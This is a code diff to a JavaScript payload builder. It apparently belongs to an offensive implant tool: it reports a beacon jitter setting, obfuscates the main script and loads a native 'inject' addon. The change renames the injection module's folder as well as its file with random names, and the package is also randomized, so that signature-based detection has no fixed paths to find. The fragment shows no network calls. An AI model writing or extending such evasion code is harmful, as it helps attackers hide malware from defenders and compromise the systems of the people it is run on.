@@ -74,9 +74,11 @@ async function main() {
     console.log(`  Jitter:          ${config.jitter}s`);
     console.log('');
 
-    // Generate random module name
+    // Generate random module name and folder name
     const randomModuleName = generateRandomModuleName();
+    const randomFolderName = generateRandomModuleName();
     console.log(`[+] Generated random module name: ${randomModuleName}`);
+    console.log(`[+] Generated random folder name: ${randomFolderName}`);
     console.log('');
 
     // Build native addon with random name
@@ -99,7 +101,7 @@ async function main() {
         process.exit(1);
     }
 
-    buildPayload(config, JavaScriptObfuscator, randomModuleName);
+    buildPayload(config, JavaScriptObfuscator, randomModuleName, randomFolderName);
 }
 
 function generateRandomModuleName() {
@@ -164,7 +166,7 @@ function restoreModuleName() {
     }
 }
 
-function buildPayload(config, JavaScriptObfuscator, moduleName) {
+function buildPayload(config, JavaScriptObfuscator, moduleName, folderName) {
 
 // Directories
 const sourceDir = __dirname;
@@ -244,10 +246,10 @@ if (config.ua) {
     );
 }
 
-// Replace inject module name with random name
+// Replace inject module name and path with random names
 mainCode = mainCode.replace(
     /require\(['"]\.\/build\/Release\/inject\.node['"]\)/g,
-    `require('./build/Release/${moduleName}.node')`
+    `require('./${folderName}/${moduleName}.node')`
 );
 
 // Obfuscate main.js
@@ -285,9 +287,9 @@ if (fs.existsSync(moduleSrc)) {
     process.exit(1);
 }
 
-// Create build directory structure
-fs.mkdirSync(path.join(outputDir, 'build', 'Release'), { recursive: true });
-fs.copyFileSync(moduleDst, path.join(outputDir, 'build', 'Release', `${moduleName}.node`));
+// Create random folder directory structure
+fs.mkdirSync(path.join(outputDir, folderName), { recursive: true });
+fs.copyFileSync(moduleDst, path.join(outputDir, folderName, `${moduleName}.node`));
 fs.unlinkSync(moduleDst);
 
 // Generate randomized package.json
